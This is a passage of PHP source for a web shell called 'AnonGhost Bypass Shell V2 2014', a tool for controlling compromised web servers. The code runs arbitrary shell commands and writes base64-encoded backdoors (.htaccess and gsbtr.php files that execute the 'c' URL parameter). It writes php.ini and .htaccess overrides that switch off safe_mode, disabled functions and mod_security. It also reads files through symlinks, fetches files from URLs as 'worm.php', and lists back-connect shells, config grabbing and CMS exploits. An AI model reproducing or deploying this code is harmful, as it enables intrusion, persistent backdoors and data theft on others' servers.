if($write){
echo "<p>Perl Unzipper Downloaded Successfully</p>";
fclose($greatshiit);
chmod("dezipper.pl",0755);

echo "<p>Unzipping File with Perl \!/ </p>";

system('perl dezipper.pl');
passthru('perl dezipper.pl');
shell_exec('perl dezipper.pl');
exec('perl dezipper.pl');
proc_open('perl dezipper.pl');

echo"<br><a href=wooooot/1.txt TARGET='_blank'>Link=====><font color=red size=3 face='Courier New'><b>Root Path</b></font></a>";

}
}
}



if(isset($_GET['action']) && $_GET['action'] == 'zonh'){
echo '<center><b class="conte">
<a href="?action=mysqslsls">MySQL & PostgreSql Connect</a> -
<a href="?action=cmd">Command Execution</a> -
<a href="?action=com64">Base64 Command</a> -
<a href="?action=vgrab">Config Grabber</a> -
<a href="?action=subdomainchkrezes">Subdomain Checker</a> -
<a href="?action=joomlarvrssrvetll">Joomla Reverse Server</a> -    
<a href="?action=wordddprssrrrvrse">Wordpress Reverse Server</a> -
<a href="?action=cari">Find Directory Writable/Readable</a> -
<a href="?action=zonh">Zone-h Notifier</a> -
<a href="?action=shhhshell">Shtml Command Shell</a> -
<a href="?action=beko">Back connect Simple</a> -
<a href="?action=rubybckconnnect">Ruby BackConnect</a> -
<a href="?action=prlbckacnonect">Perl BackConnect</a> -
<a href="?action=pythnonbakcncete">Python BackConnect</a> -
<a href="?action=exploit">Exploit</a> -
<a href="?action=whmcskillrer">Whcms Killer</a> -
<a href="?action=webmllllpwdchnger">Webmail Password Changer</a> -
<a href="?action=wpcdrfex">Wordpress Csrf Exploit</a>
</center>
</b>';
?><?php
}
if(isset($_GET['action']) && $_GET['action'] == 'umpetan'){
if(isset($_GET['vw'])){
$op = $_GET['vw'];
if($op == ".htaccess"){
$o = stripslashes(base64_decode("IyBPdmVycmlkZSBkZWZhdWx0IGRlbnkgcnVsZSB0byBtYWtlIC5odGFjY2VzcyBmaWxlIGFjY2Vzc2libGUgb3ZlciB3ZWINCjxGaWxlcyB+IFwiXlxcLmh0XCI+DQpPcmRlciBhbGxvdyxkZW55DQpBbGxvdyBmcm9tIGFsbA0KPC9GaWxlcz4NCkFkZFR5cGUgYXBwbGljYXRpb24veC1odHRwZC1waHAgLmh0YWNjZXNzDQoNCiMjIyMjIyBTSEVMTCAjIyMjIyMgPD9waHAgZWNobyBcIlxcblwiO3Bhc3N0aHJ1KCRfR0VUW1wnY1wnXS5cIiAyPiYxXCIpOyA/PiMjIyMjIyBMTEVIUyAjIyMjIyM="));
$a = fopen(".htaccess", "w");
fputs($a, $o);
fclose($a);
echo '<br><center>Visit <a target="_blank" href="http://'.$_SERVER['HTTP_HOST'].'/.htaccess?c=">'.$_SERVER['HTTP_HOST'].'/.htaccess?c=</a></center>';
}
else{
$o = stripslashes(base64_decode("PD9waHAgc3lzdGVtKCRfR0VUW1wnY1wnXSk7ID8+"));
$a = fopen("gsbtr.php", "w");
fputs($a, $o);
fclose($a);
echo '<br><center>Visit <a target="_blank" href="'.$_SERVER['HTTP_HOST'].'/gsbtr.php?c=">'.$_SERVER['HTTP_HOST'].'/gsbtr.php?c=</a></center>';
}
}
else{ ?><?php
}}
if(isset($_GET['action']) && $_GET['action'] == 'simling'){
if(isset($_GET['cook'])){
$a = fopen("oncha.php", "w");
fputs($a, $o);
fclose($a);
}

if(isset($_GET['fp'])){
$filepath = $_GET['fp'];
$sitepath = $_GET['sp'];
$writeblefilepath = 'myfile.txt';
$flib=$sitepath.$writeblefilepath;
@unlink($flib);
symlink($filepath, $flib);
echo readlink($flib)."\n";
echo "<textarea cols=30 rows=10>".file_get_contents("http://".$_SERVER['HTTP_HOST']."/".$writeblefilepath)."</textarea>";
@unlink($flib); 
}
else{ ?><?php } ?><?php
if(isset($_POST['site'])){
$fuckcloud = dns_get_record($_POST['site'], DNS_TXT);
print_r($fuckcloud);
}
echo '</textarea></center>';
}
?><?php

if(isset($_GET['action']) && $_GET['action'] == 'mumpet'){
?><?php if(empty($_GET['go'])){echo getcwd();}else{echo $_GET['go'];} ?><?php echo getcwd(); ?><?php
// delete
if(isset($_GET['delete']) && !empty($_GET['action']) && $_GET['action'] == 'mumpet'){
$file = $_GET['delete'];
// if exist
if(is_dir($file) || file_exists($file)){
// if file del
if(!is_dir($file)){
unlink($file);
echo '&nbsp;&nbsp;&nbsp;&nbsp;<font color="#b0b000">File deleted</font><br><br>';
}
if(is_dir($file)){
function rmdirs($d) {
$f = glob($d . '*', GLOB_MARK);
foreach($f as $z){
if(is_dir($z)) rmdirs($z);
else unlink($z);
}
if(is_dir($d)) rmdir($d);
}
rmdirs($file);
echo '&nbsp;&nbsp;&nbsp;&nbsp;<font color="#b0b000">Folder deleted</font><br><br>';
}
}
else{
echo '&nbsp;&nbsp;&nbsp;&nbsp;<font color="red">File or folder does not exist</font><br><br>';
}
}

// rename
if(isset($_GET['old_name']) && !empty($_GET['rename_file']) && !empty($_GET['action']) && $_GET['action'] == 'mumpet'){
$old = $_GET['old_name'];
$new = $_GET['rename_file'];
// if new file or folder exist
if(is_dir($new) || file_exists($new)){
echo '&nbsp;&nbsp;&nbsp;&nbsp;<font color="red">File or folder exists.</font> <a href="?delete='.$new.'&action=mumpet">delete</a><br><br>';
}
else{
// if file or folder exist
if(is_dir($old) || file_exists($old)){
if(rename($old, $new)){
if(is_dir($old)){
echo "&nbsp;&nbsp;&nbsp;&nbsp;<font color=\"#b0b000\">Folder renamed sucsessfuly to ".$new."</font>, <a href=\"?view=".$new."\">open</a><br><br>";
}
if(!is_dir($old)){
echo "&nbsp;&nbsp;&nbsp;&nbsp;<font color=\"#b0b000\">File renamed sucsessfuly to ".$new."</font>, <a href=\"?view=".$new."\">open</a><br><br>";
}
}
else{
echo "&nbsp;&nbsp;&nbsp;&nbsp;<font color=\"red\">Problem renaming ".$old."</font><br><br>";
}
}
else{
echo '&nbsp;&nbsp;&nbsp;&nbsp;<font color="red">File or folder not found.</font><br><br>';
}
}
}

if(isset($_GET['rename']) && !empty($_GET['action']) && $_GET['action'] == 'mumpet'){
$file = $_GET['rename'];
?><?php echo $file; ?><?php echo $file; ?><?php
}
// new dir
if(isset($_GET['go']) && !empty($_GET['newdir']) && !empty($_GET['action']) && $_GET['action'] == 'mumpet'){
$dir = $_GET['go'];
$new = $_GET['newdir'];
$currect = getcwd();
// if dir is dir
if(is_dir($dir)){
// if dir exist
if(is_dir($new)){
echo '&nbsp;&nbsp;&nbsp;&nbsp;<font color="red">Directory exist.</font> <a href="?del_dir='.$currect.'\\'.$new.'&action=mumpet">delete</a><br><br>';
}
else{
if(mkdir($new)){
echo '&nbsp;&nbsp;&nbsp;&nbsp;<font color="#b0b000">Directory created</font><br><br>';
}
else{
echo '&nbsp;&nbsp;&nbsp;&nbsp;<font color="red">Problem creating directory</font><br><br>';
}
if(!is_dir($dir)){
chdir($go);
if(mkdir($new)){
echo '&nbsp;&nbsp;&nbsp;&nbsp;<font color="#b0b000">Directory created</font><br><br>';
}
else{
echo '&nbsp;&nbsp;&nbsp;&nbsp;<font color="red">Problem creating directory</font><br><br>';
}
}

}
}
}
$self = $_SERVER['PHP_SELF'];
$dir = getcwd();
if(isset($_GET['go']))
{
$dir = $_GET['go'];
}
if(is_dir($dir))
{
$handle = opendir($dir);
{
		
showDrives();
?><?php echo $_SERVER['PHP_SELF'].'?action=mumpet&go='.getcwd(); ?><?php echo $_SERVER['HTTP_REFERER']; ?><?php
if($dir[(strlen($dir)-1)] != '/'){$dir = $dir.'/';}
while (($file = readdir($handle)) != false) {
if ($file != "." && $file != "..")
{
$color = 'red';
if(is_readable($dir.$file))
{
$color = 'yellow';
}
if(is_writable($dir.$file))
{
$color = '#00ff00';
}
if(is_dir($dir.$file))
{
?><?php echo $color?><?php echo $self ?><?php echo $dir.$file ?><?php echo $file ?><?php echo HumanReadableFilesize(dirSize($dir.$file));?><?php echo getFilePermissions($dir.$file);?><?php echo getperms($dir); ?><?php echo $self;?><?php echo $dir.$file;?><?php echo $self;?><?php echo $dir.$file;?><?php echo $self;?><?php echo $dir.$file;?><?php echo $self;?><?php echo $dir.$file;?><?php
}
//Its a file 
else
{
?><?php echo $color?><?php echo $self ?><?php echo $dir.$file ?><?php echo $file ?><?php echo HumanReadableFilesize(filesize($dir.$file));?><?php echo getFilePermissions($dir.$file);?><?php echo getperms($dir.$file); ?><?php echo $self;?><?php echo $dir.$file;?><?php echo $self;?><?php echo $dir.$file;?><?php echo $self;?><?php echo $dir.$file;?><?php
}
}
}
closedir($handle);
}
}
else
{
echo "<p class='alert_red' id='margins'>Permission Denied</p>";
}
?><?php
}
?><?php
if(!isset($_GET['action']) && !isset($_GET['upload']) && !isset($_GET['get']) && !isset($_GET['turnoff']) && !isset($_GET['view']) && !isset($_GET['db'])){
if($_POST['pateni']=='sikat'){
@error_reporting(0);
$phpini =
'c2FmZV9tb2RlID0gT0ZGDQpTYWZlX21vZGVfZ2lkID0gT0ZGDQpkaXNhYmxlX2Z1bmN0aW9ucyA9IE5PTkUNCmRpc2FibGVfY2xhc3NlcyA9IE5PTkUNCm9wZW5fYmFzZWRpciA9IE9GRg0Kc3Vob3Npbi5leGVjdXRvci5mdW5jLmJsYWNrbGlzdCA9IE5PTkU=';
$file = fopen("php.ini","w+");
$write = fwrite ($file ,base64_decode($phpini));
fclose($file);
$htaccess ='PElmTW9kdWxlIG1vZF9zZWN1cml0eS5jPg0KU2VjRmlsdGVyRW5naW5lIE9mZg0KU2VjRmlsdGVyU2NhblBPU1QgT2ZmDQpTZWNGaWx0ZXJDaGVja1VSTEVuY29kaW5nIE9mZg0KU2VjRmlsdGVyQ2hlY2tDb29raWVGb3JtYXQgT2ZmDQpTZWNGaWx0ZXJDaGVja1VuaWNvZGVFbmNvZGluZyBPZmYNClNlY0ZpbHRlck5vcm1hbGl6ZUNvb2tpZXMgT2ZmDQo8L0lmTW9kdWxlPg==';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
echo '<meta http-equiv="refresh" content="2; url=?'.$pwd.'" /><br><br><br><b><center><span style="font-size:25px; font-family:Fredericka the Great; color:#009900">Bypassed !</span></center></b>';
exit;
}
echo '
<br><center><font face="Tahoma" color="#007700" size="2pt"><b>Disable Function :
</b></font><form method="POST">
<input name="pateni" type="hidden" value="sikat">';

if(''==($func=@ini_get('disable_functions')))
{
echo "<b><font color=#00bb00>No Security for Functions</font></b>";
}else{
echo '<b><font color=#d00000>[ Please Bypass Safemode First! ]</font></b><br><br>';
echo "<div id='boxe'><font color=#ff0000>$func</font></div>";

echo '<br><input type="submit" value="Bypass Disabled Functions">';
}
echo '</center><br>';
echo "<br><br><center><b><font face='Tahoma' color='#007700' size='2pt'>Server IP : </font></b></td><font face='Tahoma' color='#00bb00' size='2pt' />";echo $serverIP = gethostbyname($_SERVER["HTTP_HOST"]);
echo " &nbsp;&nbsp;&nbsp;&nbsp; <b><a href='http://bing.com/search?q=ip:".$serverIP."&go=&form=QBLH&filt=all' target=\"_blank\">Bing Search
 </a></b> &nbsp;&nbsp;-&nbsp;&nbsp;  <b><a href='http://zone-h.com/archive/ip=".$serverIP."
' target=\"_blank\">Zone-H</a></b></center><br>";
echo '<br><center><b class="cont" align="center"><font face="Tahoma" color="#007700" size="2pt">Apache Modules : </font></b>
<select >';
			
if(function_exists("apache_get_modules")) {
foreach (apache_get_modules() as $module) {
echo "<option>".$module."</option>";
}
}else {
echo "<option>NONE</option>";
}
echo '</select></center>';
echo '<br><br><center><span style="font-size:35px; font-family:Fredericka the Great; color:#009900">AnonGhost Bypass Shell V2 2014</span><br><font color="#007700" face="Tahoma, Geneva, sans-serif" style="font-size: 7pt"> is created for Educational Purpose and testing on your own server, and not responsible for any misuse of it.</font><br><font color="#b0b000" size="1pt"></font><br><br><font color="#007700" size="1pt">Coded by </font><font  color="#00bb00" size="1pt">Virusa Worm</font> <font color="#007700" size="1pt">-</font> <font color="#00bb00" size="1pt">Mauritania Attacker</font> | <font color="#007700" size="1pt">Special thankz to : </font><font color="#00bb00" size="1pt">AnonGhost Team</font><br><br><center><div class="logindiv"><table cellpadding="7" cellspacing="2">
<center><br><iframe src="https://www.facebook.com/plugins/like.php?href=https://www.facebook.com/AnonGhostOfficial2&amp;send=false&amp;layout=standard&amp;width=400&amp;show_faces=false&amp;action=like&amp;colorscheme=light&amp;font=arial&amp;height=35" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:350px; height:20px;" allowTransparency="true"></iframe></center></table></div></center><br><br><font color="#007700" size="1pt">Greetz to : </font><br><font color="#00bb00" size="1pt">
AnonGhost - Teamp0ison - ZHC - Mauritania HaCker Team - 3xp1r3 Cyber Army - AnonSec - Robot Pirates - X-Blackerz INC. - Pak Cyber Pyrates - iMHATiMi.ORG - Afghan Cyber Army (ACA) - <font color="#007700" size="1pt">[ </font>Tanpa Bicara - Maniak k4Sur <font color="#007700" size="1pt">[pasangan galo.. lol..]]</font></font></center><br>';	

}


?><?php
if(isset($_GET['action']) && !empty($_GET['action'])){
$action = $_GET['action'];
if($action == "phpinfo"){
phpinfo();
}

if($action == 'aplot'){
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Uploader</span><br></center>';
echo '<br /><center><font face="Tahoma" color="#007700" size="2pt">Upload Files From Computer</font><br><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" value="Choose file" size="60" style="border: 1px solid #007700 ; border-radius: 4px; box-shadow: 0px 0px 4px #007700;"> <input name="_upl" type="submit" id="_upl" value="&nbsp;&nbsp;Upload&nbsp;&nbsp;"></form></center><br><br>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<br /><br /><center><b>upload sukses.. </b><img src="http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/41.gif"></center><br><br>'; }
	else { echo '<center><font face="Tahoma" color="#ff0000" size="2pt">aseeeemmm.., ora iso upload... </font><img src="http://l.yimg.com/us.yimg.com/i/mesg/emoticons7/24.gif"></center><br>'; }
}
if (isset($_POST['upload_url'])) {$file=$_POST['upload_url_text']; $newfile=$_POST['rename']; if (!copy($file, $newfile)) {echo "failed to copy $file...\\n";}}
echo '<center><font face="Tahoma" color="#007700" size="2pt">Upload Files From URL</font><br><form method="POST" enctype="multipart/form-data"><input type="hidden" name="action" value="add"><input type="text" name="upload_url_text" size="50"><br><br><font face="Tahoma" color="#007700" size="2pt">Rename to: </font><input type="text" name="rename" size="15" value="worm.php"><br><br><input type="submit" value="&nbsp;&nbsp;Upload File&nbsp;&nbsp;" name="upload_url"></form></center>';
}

if($action == "kill"){
echo '<center>Do you really want to delete this shell ?</center><br><br>';
?><?php echo $_SERVER['PHP_SELF']; ?><?php
}
if($action == "killit"){
$file = $_SERVER['PHP_SELF'];
if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
die('<br><br><b class="tmp"><font color="#ff0000" size="2pt"><center>Shell has been Killed...Take Care And Stay Safe</center></font></b><meta http-equiv="refresh" content="3; url=?".$pwd."" />');
else
echo '<font color="#fff600" size="2pt">unlink error!</font>';
}
if($action == "logout"){
unset($_SESSION['loggedin']);
echo '<center><span style="font-size:20px; font-family:Fredericka the Great; color:#d00000">You Have Logged Out Bro ' .$username. ' ..</span></center><br><br>';}
}}
else{
//IF SOMEONE GET BANNED SHELL WILL SUICIDE LIKE KAMIKAZ wkwkwkkwkwkw xD
if(isset($_SESSION['banned'])){
if($_SESSION['banned'] == '13'){
$file = $_SERVER['PHP_SELF'];
if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
die('<br><br><b class="tmp"><font color="#ff0000" size="2pt"><center>I SUICIDE BECAUSE YOUR STUPID BEHAVIOUR xD ! AND YOU THINK THAT YOU ARE SMART lulZ !</center></font></b><meta http-equiv="refresh" content="3; url=?".$pwd."" />');

}}
?><?php echo '<font color="#009900" face="Tahoma, Geneva, sans-serif" style="font-size: 7pt">Kernel Version : </font><font color="#00bb00" face="Tahoma, Geneva, sans-serif" style="font-size: 7pt">';echo php_uname(); echo '</font>'; ?><?php
}
if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['username']) && !empty($_POST['username']) ){
$pass = $_POST['pass'];
$user = $_POST['username'];
if($pass > 50){
die("<center><b><font color='#b0b000'>Maybe you are Drunk O.o...".$warn."</font></b></center>
    ");
}
if($pass != $password || $user!=$username){
if(isset($_SESSION['banned'])){
if($_SESSION['banned'] == '1'){
$_SESSION['banned'] = '2';
die("<center><b><font color='#b0b000'>MadaFucka' What are you trying Skid :p ".$warn."</font></b> <b><h3><font color='#ff0000'>BANNED</font></h3></b></center>");
}
if($_SESSION['banned'] == '2'){
$_SESSION['banned'] = '3';
die("<center><b><font color='#b0b000'>".$warn."Go Play in Da Street Script Kiddi u were banned xD</font></b><br><b><h2><font color='#ff0000'>You have been BANNED!</font></h2></b></center>");
}
}
else{
$_SESSION['banned'] = '1';
}
}
else{
$_SESSION['loggedin'] = 'true';
echo "<center><br><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Salam Aleykum " .$username. " . &hearts; </span></center>";
echo "<br><br><center><b><font color='#007700' face='Tahoma' style='font-size: 11pt'>&check; You are Successfully Logged in and Redirecting Now Ghost.... <a href='".$pwd."'> or Click here</a></font></b><meta http-equiv='refresh' content='10; url=?".$pwd."' /></center>";
header('location: '.$_SERVER['PHP_SELF']);
}
}
?><?php

if(!isset($_SESSION['loggedin'])){echo $about;}
if (strtoupper(substr(PHP_OS, 0, 3)) === 'UNI'){
echo "user = ".@get_current_user()." | uid= ".@getmyuid()." | gid= ".@getmygid();
} ?>